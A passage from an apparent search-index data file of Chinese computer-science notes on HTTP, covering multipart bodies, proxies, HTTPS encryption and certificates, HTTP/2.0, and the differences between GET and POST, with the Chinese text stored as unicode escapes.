\u5728\u4E0D\u652F\u6301\u8303\u56F4\u8BF7\u6C42\u7684\u60C5\u51B5\u4E0B\uFF0C\u670D\u52A1\u5668\u4F1A\u8FD4\u56DE 200 OK \u72B6\u6001\u7801\u3002`},{header:"\u5206\u5757\u4F20\u8F93\u7F16\u7801",slug:"\u5206\u5757\u4F20\u8F93\u7F16\u7801",content:"Chunked Transfer Encoding\uFF0C\u53EF\u4EE5\u628A\u6570\u636E\u5206\u5272\u6210\u591A\u5757\uFF0C\u8BA9\u6D4F\u89C8\u5668\u9010\u6B65\u663E\u793A\u9875\u9762\u3002"},{header:"\u591A\u90E8\u5206\u5BF9\u8C61\u96C6\u5408",slug:"\u591A\u90E8\u5206\u5BF9\u8C61\u96C6\u5408",content:`\u4E00\u4EFD\u62A5\u6587\u4E3B\u4F53\u5185\u53EF\u542B\u6709\u591A\u79CD\u7C7B\u578B\u7684\u5B9E\u4F53\u540C\u65F6\u53D1\u9001\uFF0C\u6BCF\u4E2A\u90E8\u5206\u4E4B\u95F4\u7528 boundary \u5B57\u6BB5\u5B9A\u4E49\u7684\u5206\u9694\u7B26\u8FDB\u884C\u5206\u9694\uFF0C\u6BCF\u4E2A\u90E8\u5206\u90FD\u53EF\u4EE5\u6709\u9996\u90E8\u5B57\u6BB5\u3002
\u4F8B\u5982\uFF0C\u4E0A\u4F20\u591A\u4E2A\u8868\u5355\u65F6\u53EF\u4EE5\u4F7F\u7528\u5982\u4E0B\u65B9\u5F0F\uFF1A
Content-Type: multipart/form-data; boundary=AaB03x --AaB03x
Content-Disposition: form-data; name="submit-name" Larry
--AaB03x
Content-Disposition: form-data; name="files"; filename="file1.txt"
Content-Type: text/plain ... contents of file1.txt ...
--AaB03x--`},{header:"\u865A\u62DF\u4E3B\u673A",slug:"\u865A\u62DF\u4E3B\u673A",content:"HTTP/1.1 \u4F7F\u7528\u865A\u62DF\u4E3B\u673A\u6280\u672F\uFF0C\u4F7F\u5F97\u4E00\u53F0\u670D\u52A1\u5668\u62E5\u6709\u591A\u4E2A\u57DF\u540D\uFF0C\u5E76\u4E14\u5728\u903B\u8F91\u4E0A\u53EF\u4EE5\u770B\u6210\u591A\u4E2A\u670D\u52A1\u5668\u3002"},{header:"\u901A\u4FE1\u6570\u636E\u8F6C\u53D1",slug:"\u901A\u4FE1\u6570\u636E\u8F6C\u53D1",content:""},{header:"1. \u4EE3\u7406",slug:"_1-\u4EE3\u7406",content:`\u4EE3\u7406\u670D\u52A1\u5668\u63A5\u53D7\u5BA2\u6237\u7AEF\u7684\u8BF7\u6C42\uFF0C\u5E76\u4E14\u8F6C\u53D1\u7ED9\u5176\u5B83\u670D\u52A1\u5668\u3002
\u4F7F\u7528\u4EE3\u7406\u7684\u4E3B\u8981\u76EE\u7684\u662F\uFF1A \u7F13\u5B58
\u8D1F\u8F7D\u5747\u8861
\u7F51\u7EDC\u8BBF\u95EE\u63A7\u5236
\u8BBF\u95EE\u65E5\u5FD7\u8BB0\u5F55 \u4EE3\u7406\u670D\u52A1\u5668\u5206\u4E3A\u6B63\u5411\u4EE3\u7406\u548C\u53CD\u5411\u4EE3\u7406\u4E24\u79CD\uFF1A \u7528\u6237\u5BDF\u89C9\u5F97\u5230\u6B63\u5411\u4EE3\u7406\u7684\u5B58\u5728\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a314bb79-5b18-4e63-a976-3448bffa6f1b.png" width=") \u800C\u53CD\u5411\u4EE3\u7406\u4E00\u822C\u4F4D\u4E8E\u5185\u90E8\u7F51\u7EDC\u4E2D\uFF0C\u7528\u6237\u5BDF\u89C9\u4E0D\u5230\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2d09a847-b854-439c-9198-b29c65810944.png" width=")`},{header:"2. \u7F51\u5173",slug:"_2-\u7F51\u5173",content:"\u4E0E\u4EE3\u7406\u670D\u52A1\u5668\u4E0D\u540C\u7684\u662F\uFF0C\u7F51\u5173\u670D\u52A1\u5668\u4F1A\u5C06 HTTP \u8F6C\u5316\u4E3A\u5176\u5B83\u534F\u8BAE\u8FDB\u884C\u901A\u4FE1\uFF0C\u4ECE\u800C\u8BF7\u6C42\u5176\u5B83\u975E HTTP \u670D\u52A1\u5668\u7684\u670D\u52A1\u3002"},{header:"3. \u96A7\u9053",slug:"_3-\u96A7\u9053",content:"\u4F7F\u7528 SSL \u7B49\u52A0\u5BC6\u624B\u6BB5\uFF0C\u5728\u5BA2\u6237\u7AEF\u548C\u670D\u52A1\u5668\u4E4B\u95F4\u5EFA\u7ACB\u4E00\u6761\u5B89\u5168\u7684\u901A\u4FE1\u7EBF\u8DEF\u3002"},{header:"\u516D\u3001HTTPS",slug:"\u516D\u3001https",content:`HTTP \u6709\u4EE5\u4E0B\u5B89\u5168\u6027\u95EE\u9898\uFF1A \u4F7F\u7528\u660E\u6587\u8FDB\u884C\u901A\u4FE1\uFF0C\u5185\u5BB9\u53EF\u80FD\u4F1A\u88AB\u7A83\u542C\uFF1B
\u4E0D\u9A8C\u8BC1\u901A\u4FE1\u65B9\u7684\u8EAB\u4EFD\uFF0C\u901A\u4FE1\u65B9\u7684\u8EAB\u4EFD\u6709\u53EF\u80FD\u906D\u9047\u4F2A\u88C5\uFF1B
\u65E0\u6CD5\u8BC1\u660E\u62A5\u6587\u7684\u5B8C\u6574\u6027\uFF0C\u62A5\u6587\u6709\u53EF\u80FD\u906D\u7BE1\u6539\u3002 HTTPS \u5E76\u4E0D\u662F\u65B0\u534F\u8BAE\uFF0C\u800C\u662F\u8BA9 HTTP \u5148\u548C SSL\uFF08Secure Sockets Layer\uFF09\u901A\u4FE1\uFF0C\u518D\u7531 SSL \u548C TCP \u901A\u4FE1\uFF0C\u4E5F\u5C31\u662F\u8BF4 HTTPS \u4F7F\u7528\u4E86\u96A7\u9053\u8FDB\u884C\u901A\u4FE1\u3002
\u901A\u8FC7\u4F7F\u7528 SSL\uFF0CHTTPS \u5177\u6709\u4E86\u52A0\u5BC6\uFF08\u9632\u7A83\u542C\uFF09\u3001\u8BA4\u8BC1\uFF08\u9632\u4F2A\u88C5\uFF09\u548C\u5B8C\u6574\u6027\u4FDD\u62A4\uFF08\u9632\u7BE1\u6539\uFF09\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ssl-offloading.jpg" width="700)`},{header:"\u52A0\u5BC6",slug:"\u52A0\u5BC6",content:""},{header:"1. \u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6",slug:"_1-\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6",content:`\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\uFF08Symmetric-Key Encryption\uFF09\uFF0C\u52A0\u5BC6\u548C\u89E3\u5BC6\u4F7F\u7528\u540C\u4E00\u5BC6\u94A5\u3002 \u4F18\u70B9\uFF1A\u8FD0\u7B97\u901F\u5EA6\u5FEB\uFF1B
\u7F3A\u70B9\uFF1A\u65E0\u6CD5\u5B89\u5168\u5730\u5C06\u5BC6\u94A5\u4F20\u8F93\u7ED9\u901A\u4FE1\u65B9\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7fffa4b8-b36d-471f-ad0c-a88ee763bb76.png" width="600)`},{header:"2.\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6",slug:"_2-\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6",content:`\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\uFF0C\u53C8\u79F0\u516C\u5F00\u5BC6\u94A5\u52A0\u5BC6\uFF08Public-Key Encryption\uFF09\uFF0C\u52A0\u5BC6\u548C\u89E3\u5BC6\u4F7F\u7528\u4E0D\u540C\u7684\u5BC6\u94A5\u3002
\u516C\u5F00\u5BC6\u94A5\u6240\u6709\u4EBA\u90FD\u53EF\u4EE5\u83B7\u5F97\uFF0C\u901A\u4FE1\u53D1\u9001\u65B9\u83B7\u5F97\u63A5\u6536\u65B9\u7684\u516C\u5F00\u5BC6\u94A5\u4E4B\u540E\uFF0C\u5C31\u53EF\u4EE5\u4F7F\u7528\u516C\u5F00\u5BC6\u94A5\u8FDB\u884C\u52A0\u5BC6\uFF0C\u63A5\u6536\u65B9\u6536\u5230\u901A\u4FE1\u5185\u5BB9\u540E\u4F7F\u7528\u79C1\u6709\u5BC6\u94A5\u89E3\u5BC6\u3002
\u975E\u5BF9\u79F0\u5BC6\u94A5\u9664\u4E86\u7528\u6765\u52A0\u5BC6\uFF0C\u8FD8\u53EF\u4EE5\u7528\u6765\u8FDB\u884C\u7B7E\u540D\u3002\u56E0\u4E3A\u79C1\u6709\u5BC6\u94A5\u65E0\u6CD5\u88AB\u5176\u4ED6\u4EBA\u83B7\u53D6\uFF0C\u56E0\u6B64\u901A\u4FE1\u53D1\u9001\u65B9\u4F7F\u7528\u5176\u79C1\u6709\u5BC6\u94A5\u8FDB\u884C\u7B7E\u540D\uFF0C\u901A\u4FE1\u63A5\u6536\u65B9\u4F7F\u7528\u53D1\u9001\u65B9\u7684\u516C\u5F00\u5BC6\u94A5\u5BF9\u7B7E\u540D\u8FDB\u884C\u89E3\u5BC6\uFF0C\u5C31\u80FD\u5224\u65AD\u8FD9\u4E2A\u7B7E\u540D\u662F\u5426\u6B63\u786E\u3002 \u4F18\u70B9\uFF1A\u53EF\u4EE5\u66F4\u5B89\u5168\u5730\u5C06\u516C\u5F00\u5BC6\u94A5\u4F20\u8F93\u7ED9\u901A\u4FE1\u53D1\u9001\u65B9\uFF1B
\u7F3A\u70B9\uFF1A\u8FD0\u7B97\u901F\u5EA6\u6162\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/39ccb299-ee99-4dd1-b8b4-2f9ec9495cb4.png" width="600)`},{header:"3. HTTPS \u91C7\u7528\u7684\u52A0\u5BC6\u65B9\u5F0F",slug:"_3-https-\u91C7\u7528\u7684\u52A0\u5BC6\u65B9\u5F0F",content:`\u4E0A\u9762\u63D0\u5230\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\u65B9\u5F0F\u7684\u4F20\u8F93\u6548\u7387\u66F4\u9AD8\uFF0C\u4F46\u662F\u65E0\u6CD5\u5B89\u5168\u5730\u5C06\u5BC6\u94A5 Secret Key \u4F20\u8F93\u7ED9\u901A\u4FE1\u65B9\u3002\u800C\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\u65B9\u5F0F\u53EF\u4EE5\u4FDD\u8BC1\u4F20\u8F93\u7684\u5B89\u5168\u6027\uFF0C\u56E0\u6B64\u6211\u4EEC\u53EF\u4EE5\u5229\u7528\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\u65B9\u5F0F\u5C06 Secret Key \u4F20\u8F93\u7ED9\u901A\u4FE1\u65B9\u3002HTTPS \u91C7\u7528\u6DF7\u5408\u7684\u52A0\u5BC6\u673A\u5236\uFF0C\u6B63\u662F\u5229\u7528\u4E86\u4E0A\u9762\u63D0\u5230\u7684\u65B9\u6848\uFF1A \u4F7F\u7528\u975E\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\u65B9\u5F0F\uFF0C\u4F20\u8F93\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\u65B9\u5F0F\u6240\u9700\u8981\u7684 Secret Key\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u5B89\u5168\u6027;
\u83B7\u53D6\u5230 Secret Key \u540E\uFF0C\u518D\u4F7F\u7528\u5BF9\u79F0\u5BC6\u94A5\u52A0\u5BC6\u65B9\u5F0F\u8FDB\u884C\u901A\u4FE1\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u6548\u7387\u3002\uFF08\u4E0B\u56FE\u4E2D\u7684 Session Key \u5C31\u662F Secret Key\uFF09 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/How-HTTPS-Works.png" width="600)`},{header:"\u8BA4\u8BC1",slug:"\u8BA4\u8BC1",content:`\u901A\u8FC7\u4F7F\u7528 \u8BC1\u4E66 \u6765\u5BF9\u901A\u4FE1\u65B9\u8FDB\u884C\u8BA4\u8BC1\u3002
\u6570\u5B57\u8BC1\u4E66\u8BA4\u8BC1\u673A\u6784\uFF08CA\uFF0CCertificate Authority\uFF09\u662F\u5BA2\u6237\u7AEF\u4E0E\u670D\u52A1\u5668\u53CC\u65B9\u90FD\u53EF\u4FE1\u8D56\u7684\u7B2C\u4E09\u65B9\u673A\u6784\u3002
\u670D\u52A1\u5668\u7684\u8FD0\u8425\u4EBA\u5458\u5411 CA \u63D0\u51FA\u516C\u5F00\u5BC6\u94A5\u7684\u7533\u8BF7\uFF0CCA \u5728\u5224\u660E\u63D0\u51FA\u7533\u8BF7\u8005\u7684\u8EAB\u4EFD\u4E4B\u540E\uFF0C\u4F1A\u5BF9\u5DF2\u7533\u8BF7\u7684\u516C\u5F00\u5BC6\u94A5\u505A\u6570\u5B57\u7B7E\u540D\uFF0C\u7136\u540E\u5206\u914D\u8FD9\u4E2A\u5DF2\u7B7E\u540D\u7684\u516C\u5F00\u5BC6\u94A5\uFF0C\u5E76\u5C06\u8BE5\u516C\u5F00\u5BC6\u94A5\u653E\u5165\u516C\u5F00\u5BC6\u94A5\u8BC1\u4E66\u540E\u7ED1\u5B9A\u5728\u4E00\u8D77\u3002
\u8FDB\u884C HTTPS \u901A\u4FE1\u65F6\uFF0C\u670D\u52A1\u5668\u4F1A\u628A\u8BC1\u4E66\u53D1\u9001\u7ED9\u5BA2\u6237\u7AEF\u3002\u5BA2\u6237\u7AEF\u53D6\u5F97\u5176\u4E2D\u7684\u516C\u5F00\u5BC6\u94A5\u4E4B\u540E\uFF0C\u5148\u4F7F\u7528\u6570\u5B57\u7B7E\u540D\u8FDB\u884C\u9A8C\u8BC1\uFF0C\u5982\u679C\u9A8C\u8BC1\u901A\u8FC7\uFF0C\u5C31\u53EF\u4EE5\u5F00\u59CB\u901A\u4FE1\u4E86\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2017-06-11-ca.png" width=")`},{header:"\u5B8C\u6574\u6027\u4FDD\u62A4",slug:"\u5B8C\u6574\u6027\u4FDD\u62A4",content:`SSL \u63D0\u4F9B\u62A5\u6587\u6458\u8981\u529F\u80FD\u6765\u8FDB\u884C\u5B8C\u6574\u6027\u4FDD\u62A4\u3002
HTTP \u4E5F\u63D0\u4F9B\u4E86 MD5 \u62A5\u6587\u6458\u8981\u529F\u80FD\uFF0C\u4F46\u4E0D\u662F\u5B89\u5168\u7684\u3002\u4F8B\u5982\u62A5\u6587\u5185\u5BB9\u88AB\u7BE1\u6539\u4E4B\u540E\uFF0C\u540C\u65F6\u91CD\u65B0\u8BA1\u7B97 MD5 \u7684\u503C\uFF0C\u901A\u4FE1\u63A5\u6536\u65B9\u662F\u65E0\u6CD5\u610F\u8BC6\u5230\u53D1\u751F\u4E86\u7BE1\u6539\u3002
HTTPS \u7684\u62A5\u6587\u6458\u8981\u529F\u80FD\u4E4B\u6240\u4EE5\u5B89\u5168\uFF0C\u662F\u56E0\u4E3A\u5B83\u7ED3\u5408\u4E86\u52A0\u5BC6\u548C\u8BA4\u8BC1\u8FD9\u4E24\u4E2A\u64CD\u4F5C\u3002\u8BD5\u60F3\u4E00\u4E0B\uFF0C\u52A0\u5BC6\u4E4B\u540E\u7684\u62A5\u6587\uFF0C\u906D\u5230\u7BE1\u6539\u4E4B\u540E\uFF0C\u4E5F\u5F88\u96BE\u91CD\u65B0\u8BA1\u7B97\u62A5\u6587\u6458\u8981\uFF0C\u56E0\u4E3A\u65E0\u6CD5\u8F7B\u6613\u83B7\u53D6\u660E\u6587\u3002`},{header:"HTTPS \u7684\u7F3A\u70B9",slug:"https-\u7684\u7F3A\u70B9",content:`\u56E0\u4E3A\u9700\u8981\u8FDB\u884C\u52A0\u5BC6\u89E3\u5BC6\u7B49\u8FC7\u7A0B\uFF0C\u56E0\u6B64\u901F\u5EA6\u4F1A\u66F4\u6162\uFF1B
\u9700\u8981\u652F\u4ED8\u8BC1\u4E66\u6388\u6743\u7684\u9AD8\u989D\u8D39\u7528\u3002`},{header:"\u4E03\u3001HTTP/2.0",slug:"\u4E03\u3001http-2-0",content:""},{header:"HTTP/1.x \u7F3A\u9677",slug:"http-1-x-\u7F3A\u9677",content:`HTTP/1.x \u5B9E\u73B0\u7B80\u5355\u662F\u4EE5\u727A\u7272\u6027\u80FD\u4E3A\u4EE3\u4EF7\u7684\uFF1A \u5BA2\u6237\u7AEF\u9700\u8981\u4F7F\u7528\u591A\u4E2A\u8FDE\u63A5\u624D\u80FD\u5B9E\u73B0\u5E76\u53D1\u548C\u7F29\u77ED\u5EF6\u8FDF\uFF1B
\u4E0D\u4F1A\u538B\u7F29\u8BF7\u6C42\u548C\u54CD\u5E94\u9996\u90E8\uFF0C\u4ECE\u800C\u5BFC\u81F4\u4E0D\u5FC5\u8981\u7684\u7F51\u7EDC\u6D41\u91CF\uFF1B
\u4E0D\u652F\u6301\u6709\u6548\u7684\u8D44\u6E90\u4F18\u5148\u7EA7\uFF0C\u81F4\u4F7F\u5E95\u5C42 TCP \u8FDE\u63A5\u7684\u5229\u7528\u7387\u4F4E\u4E0B\u3002`},{header:"\u4E8C\u8FDB\u5236\u5206\u5E27\u5C42",slug:"\u4E8C\u8FDB\u5236\u5206\u5E27\u5C42",content:`HTTP/2.0 \u5C06\u62A5\u6587\u5206\u6210 HEADERS \u5E27\u548C DATA \u5E27\uFF0C\u5B83\u4EEC\u90FD\u662F\u4E8C\u8FDB\u5236\u683C\u5F0F\u7684\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400)
\u5728\u901A\u4FE1\u8FC7\u7A0B\u4E2D\uFF0C\u53EA\u4F1A\u6709\u4E00\u4E2A TCP \u8FDE\u63A5\u5B58\u5728\uFF0C\u5B83\u627F\u8F7D\u4E86\u4EFB\u610F\u6570\u91CF\u7684\u53CC\u5411\u6570\u636E\u6D41\uFF08Stream\uFF09\u3002 \u4E00\u4E2A\u6570\u636E\u6D41\uFF08Stream\uFF09\u90FD\u6709\u4E00\u4E2A\u552F\u4E00\u6807\u8BC6\u7B26\u548C\u53EF\u9009\u7684\u4F18\u5148\u7EA7\u4FE1\u606F\uFF0C\u7528\u4E8E\u627F\u8F7D\u53CC\u5411\u4FE1\u606F\u3002
\u6D88\u606F\uFF08Message\uFF09\u662F\u4E0E\u903B\u8F91\u8BF7\u6C42\u6216\u54CD\u5E94\u5BF9\u5E94\u7684\u5B8C\u6574\u7684\u4E00\u7CFB\u5217\u5E27\u3002
\u5E27\uFF08Frame\uFF09\u662F\u6700\u5C0F\u7684\u901A\u4FE1\u5355\u4F4D\uFF0C\u6765\u81EA\u4E0D\u540C\u6570\u636E\u6D41\u7684\u5E27\u53EF\u4EE5\u4EA4\u9519\u53D1\u9001\uFF0C\u7136\u540E\u518D\u6839\u636E\u6BCF\u4E2A\u5E27\u5934\u7684\u6570\u636E\u6D41\u6807\u8BC6\u7B26\u91CD\u65B0\u7EC4\u88C5\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af198da1-2480-4043-b07f-a3b91a88b815.png" width="600)`},{header:"\u670D\u52A1\u7AEF\u63A8\u9001",slug:"\u670D\u52A1\u7AEF\u63A8\u9001",content:`HTTP/2.0 \u5728\u5BA2\u6237\u7AEF\u8BF7\u6C42\u4E00\u4E2A\u8D44\u6E90\u65F6\uFF0C\u4F1A\u628A\u76F8\u5173\u7684\u8D44\u6E90\u4E00\u8D77\u53D1\u9001\u7ED9\u5BA2\u6237\u7AEF\uFF0C\u5BA2\u6237\u7AEF\u5C31\u4E0D\u9700\u8981\u518D\u6B21\u53D1\u8D77\u8BF7\u6C42\u4E86\u3002\u4F8B\u5982\u5BA2\u6237\u7AEF\u8BF7\u6C42 page.html \u9875\u9762\uFF0C\u670D\u52A1\u7AEF\u5C31\u628A script.js \u548C style.css \u7B49\u4E0E\u4E4B\u76F8\u5173\u7684\u8D44\u6E90\u4E00\u8D77\u53D1\u7ED9\u5BA2\u6237\u7AEF\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800)`},{header:"\u9996\u90E8\u538B\u7F29",slug:"\u9996\u90E8\u538B\u7F29",content:`HTTP/1.1 \u7684\u9996\u90E8\u5E26\u6709\u5927\u91CF\u4FE1\u606F\uFF0C\u800C\u4E14\u6BCF\u6B21\u90FD\u8981\u91CD\u590D\u53D1\u9001\u3002
HTTP/2.0 \u8981\u6C42\u5BA2\u6237\u7AEF\u548C\u670D\u52A1\u5668\u540C\u65F6\u7EF4\u62A4\u548C\u66F4\u65B0\u4E00\u4E2A\u5305\u542B\u4E4B\u524D\u89C1\u8FC7\u7684\u9996\u90E8\u5B57\u6BB5\u8868\uFF0C\u4ECE\u800C\u907F\u514D\u4E86\u91CD\u590D\u4F20\u8F93\u3002
\u4E0D\u4EC5\u5982\u6B64\uFF0CHTTP/2.0 \u4E5F\u4F7F\u7528 Huffman \u7F16\u7801\u5BF9\u9996\u90E8\u5B57\u6BB5\u8FDB\u884C\u538B\u7F29\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/_u4E0B_u8F7D.png" width="600)`},{header:"\u516B\u3001HTTP/1.1 \u65B0\u7279\u6027",slug:"\u516B\u3001http-1-1-\u65B0\u7279\u6027",content:`\u8BE6\u7EC6\u5185\u5BB9\u8BF7\u89C1\u4E0A\u6587 \u9ED8\u8BA4\u662F\u957F\u8FDE\u63A5
\u652F\u6301\u6D41\u6C34\u7EBF
\u652F\u6301\u540C\u65F6\u6253\u5F00\u591A\u4E2A TCP \u8FDE\u63A5
\u652F\u6301\u865A\u62DF\u4E3B\u673A
\u65B0\u589E\u72B6\u6001\u7801 100
\u652F\u6301\u5206\u5757\u4F20\u8F93\u7F16\u7801
\u65B0\u589E\u7F13\u5B58\u5904\u7406\u6307\u4EE4 max-age`},{header:"\u4E5D\u3001GET \u548C POST \u6BD4\u8F83",slug:"\u4E5D\u3001get-\u548C-post-\u6BD4\u8F83",content:""},{header:"\u4F5C\u7528",slug:"\u4F5C\u7528",content:"GET \u7528\u4E8E\u83B7\u53D6\u8D44\u6E90\uFF0C\u800C POST \u7528\u4E8E\u4F20\u8F93\u5B9E\u4F53\u4E3B\u4F53\u3002"},{header:"\u53C2\u6570",slug:"\u53C2\u6570",content:`GET \u548C POST \u7684\u8BF7\u6C42\u90FD\u80FD\u4F7F\u7528\u989D\u5916\u7684\u53C2\u6570\uFF0C\u4F46\u662F GET \u7684\u53C2\u6570\u662F\u4EE5\u67E5\u8BE2\u5B57\u7B26\u4E32\u51FA\u73B0\u5728 URL \u4E2D\uFF0C\u800C POST \u7684\u53C2\u6570\u5B58\u50A8\u5728\u5B9E\u4F53\u4E3B\u4F53\u4E2D\u3002\u4E0D\u80FD\u56E0\u4E3A POST \u53C2\u6570\u5B58\u50A8\u5728\u5B9E\u4F53\u4E3B\u4F53\u4E2D\u5C31\u8BA4\u4E3A\u5B83\u7684\u5B89\u5168\u6027\u66F4\u9AD8\uFF0C\u56E0\u4E3A\u7167\u6837\u53EF\u4EE5\u901A\u8FC7\u4E00\u4E9B\u6293\u5305\u5DE5\u5177\uFF08Fiddler\uFF09\u67E5\u770B\u3002
\u56E0\u4E3A URL \u53EA\u652F\u6301 ASCII \u7801\uFF0C\u56E0\u6B64 GET \u7684\u53C2\u6570\u4E2D\u5982\u679C\u5B58\u5728\u4E2D\u6587\u7B49\u5B57\u7B26\u5C31\u9700\u8981\u5148\u8FDB\u884C\u7F16\u7801\u3002\u4F8B\u5982 \u4E2D\u6587 \u4F1A\u8F6C\u6362\u4E3A %E4%B8%AD%E6%96%87\uFF0C\u800C\u7A7A\u683C\u4F1A\u8F6C\u6362\u4E3A %20\u3002POST \u53C2\u6570\u652F\u6301\u6807\u51C6\u5B57\u7B26\u96C6\u3002
GET /test/demo_form.asp?name1=value1&name2=value2 HTTP/1.1
POST /test/demo_form.asp HTTP/1.1
Host: w3schools.com
name1=value1&name2=value2`},{header:"\u5B89\u5168",slug:"\u5B89\u5168",content:`\u5B89\u5168\u7684 HTTP \u65B9\u6CD5\u4E0D\u4F1A\u6539\u53D8\u670D\u52A1\u5668\u72B6\u6001\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u53EA\u662F\u53EF\u8BFB\u7684\u3002
GET \u65B9\u6CD5\u662F\u5B89\u5168\u7684\uFF0C\u800C POST \u5374\u4E0D\u662F\uFF0C\u56E0\u4E3A POST \u7684\u76EE\u7684\u662F\u4F20\u9001\u5B9E\u4F53\u4E3B\u4F53\u5185\u5BB9\uFF0C\u8FD9\u4E2A\u5185\u5BB9\u53EF\u80FD\u662F\u7528\u6237\u4E0A\u4F20\u7684\u8868\u5355\u6570\u636E\uFF0C\u4E0A\u4F20\u6210\u529F\u4E4B\u540E\uFF0C\u670D\u52A1\u5668\u53EF\u80FD\u628A\u8FD9\u4E2A\u6570\u636E\u5B58\u50A8\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u56E0\u6B64\u72B6\u6001\u4E5F\u5C31\u53D1\u751F\u4E86\u6539\u53D8\u3002
\u5B89\u5168\u7684\u65B9\u6CD5\u9664\u4E86 GET \u4E4B\u5916\u8FD8\u6709\uFF1AHEAD\u3001OPTIONS\u3002
\u4E0D\u5B89\u5168\u7684\u65B9\u6CD5\u9664\u4E86 POST \u4E4B\u5916\u8FD8\u6709 PUT\u3001DELETE\u3002`},{header:"\u5E42\u7B49\u6027",slug:"\u5E42\u7B49\u6027",content:`\u5E42\u7B49\u7684 HTTP \u65B9\u6CD5\uFF0C\u540C\u6837\u7684\u8BF7\u6C42\u88AB\u6267\u884C\u4E00\u6B21\u4E0E\u8FDE\u7EED\u6267\u884C\u591A\u6B21\u7684\u6548\u679C\u662F\u4E00\u6837\u7684\uFF0C\u670D\u52A1\u5668\u7684\u72B6\u6001\u4E5F\u662F\u4E00\u6837\u7684\u3002\u6362\u53E5\u8BDD\u8BF4\u5C31\u662F\uFF0C\u5E42\u7B49\u65B9\u6CD5\u4E0D\u5E94\u8BE5\u5177\u6709\u526F\u4F5C\u7528\uFF08\u7EDF\u8BA1\u7528\u9014\u9664\u5916\uFF09\u3002
\u6240\u6709\u7684\u5B89\u5168\u65B9\u6CD5\u4E5F\u90FD\u662F\u5E42\u7B49\u7684\u3002
\u5728\u6B63\u786E\u5B9E\u73B0\u7684\u6761\u4EF6\u4E0B\uFF0CGET\uFF0CHEAD\uFF0CPUT \u548C DELETE \u7B49\u65B9\u6CD5\u90FD\u662F\u5E42\u7B49\u7684\uFF0C\u800C POST \u65B9\u6CD5\u4E0D\u662F\u3002
GET /pageX HTTP/1.1 \u662F\u5E42\u7B49\u7684\uFF0C\u8FDE\u7EED\u8C03\u7528\u591A\u6B21\uFF0C\u5BA2\u6237\u7AEF\u63A5\u6536\u5230\u7684\u7ED3\u679C\u90FD\u662F\u4E00\u6837\u7684\uFF1A
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
POST /add_row HTTP/1.1 \u4E0D\u662F\u5E42\u7B49\u7684\uFF0C\u5982\u679C\u8C03\u7528\u591A\u6B21\uFF0C\u5C31\u4F1A\u589E\u52A0\u591A\u884C\u8BB0\u5F55\uFF1A
POST /add_row HTTP/1.1 -> Adds a 1nd row
POST /add_row HTTP/1.1 -> Adds a 2nd row
POST /add_row HTTP/1.1 -> Adds a 3rd row
DELETE /idX/delete HTTP/1.1 \u662F\u5E42\u7B49\u7684\uFF0C\u5373\u4F7F\u4E0D\u540C\u7684\u8BF7\u6C42\u63A5\u6536\u5230\u7684\u72B6\u6001\u7801\u4E0D\u4E00\u6837\uFF1A
DELETE /idX/delete HTTP/1.1 -> Returns 200 if idX exists
DELETE /idX/delete HTTP/1.1 -> Returns 404 as it just got deleted
DELETE /idX/delete HTTP/1.1 -> Returns 404`},{header:"\u53EF\u7F13\u5B58",slug:"\u53EF\u7F13\u5B58",content:`\u5982\u679C\u8981\u5BF9\u54CD\u5E94\u8FDB\u884C\u7F13\u5B58\uFF0C\u9700\u8981\u6EE1\u8DB3\u4EE5\u4E0B\u6761\u4EF6\uFF1A \u8BF7\u6C42\u62A5\u6587\u7684 HTTP \u65B9\u6CD5\u672C\u8EAB\u662F\u53EF\u7F13\u5B58\u7684\uFF0C\u5305\u62EC GET \u548C HEAD\uFF0C\u4F46\u662F PUT \u548C DELETE \u4E0D\u53EF\u7F13\u5B58\uFF0CPOST \u5728\u591A\u6570\u60C5\u51B5\u4E0B\u4E0D\u53EF\u7F13\u5B58\u7684\u3002
\u54CD\u5E94\u62A5\u6587\u7684\u72B6\u6001\u7801\u662F\u53EF\u7F13\u5B58\u7684\uFF0C\u5305\u62EC\uFF1A200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501\u3002
